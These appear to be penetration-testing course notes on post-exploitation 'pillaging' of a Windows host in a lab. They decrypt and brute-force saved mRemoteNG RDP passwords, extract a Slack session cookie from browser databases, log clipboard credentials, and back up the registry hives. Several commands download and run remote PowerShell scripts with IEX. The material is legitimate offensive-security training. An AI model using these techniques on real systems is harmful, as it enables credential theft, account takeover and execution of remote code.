## Installed Applications
#### Identifying Common Applications

```cmd
C:\>dir "C:\Program Files"
```
![](Screenshot%202026-08-24%20at%2014.29.50.png)
#### Get Installed Programs via PowerShell & Registry Keys

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
![](Screenshot%202026-08-24%20at%2014.30.14.png)
#### mRemoteNG

By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`
#### Discover mRemoteNG Configuration Files

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG
```
#### mRemoteNG Configuration File - confCons.xml

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

As mentioned previously, if the user didn't set a custom master password, we can use the script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) to decrypt the password.
#### Decrypt the Password with mremoteng_decrypt

```shell
3kjS@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```
#### mRemoteNG Configuration File - confCons.xml

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```
#### Attempt to Decrypt the Password with a Custom Password

```shell
3kjS@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
```
![](Screenshot%202026-08-24%20at%2014.33.39.png)
#### Decrypt the Password with mremoteng_decrypt and a Custom Password

```shell
3kjS@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```
#### For Loop to Crack the Master Password with mremoteng_decrypt

```shell
3kjS@htb[/htb]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```
## Abusing Cookies to Get Access to IM Clients
#### Copy Firefox Cookies Database

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```
#### Extract Slack Cookie from Firefox Cookies Database

```shell
3kjS@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```
![](Pillaging-20260824-143557.png)
![](Pillaging-20260824-143700.png)
![](Pillaging-20260824-143704.png)
![](Pillaging-20260824-143707.png)
![](Pillaging-20260824-143711.png)
#### PowerShell Script - Invoke-SharpChromium

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```
#### Copy Cookies to SharpChromium Expected Location

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
#### Invoke-SharpChromium Cookies Extraction

```powershell
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```
## Clipboard
#### Monitor the Clipboard with PowerShell

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```
#### Capture Credentials from the Clipboard with Invoke-ClipboardLogger

```powershell
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```
## Roles and Services
#### restic - Initialize Backup Directory

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
```
#### restic - Back up a Directory

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password' 
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
```
#### restic - Back up a Directory with VSS

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```
#### restic - Check Backups Saved in a Repository

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots
```
#### restic - Restore a Backup with ID

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```
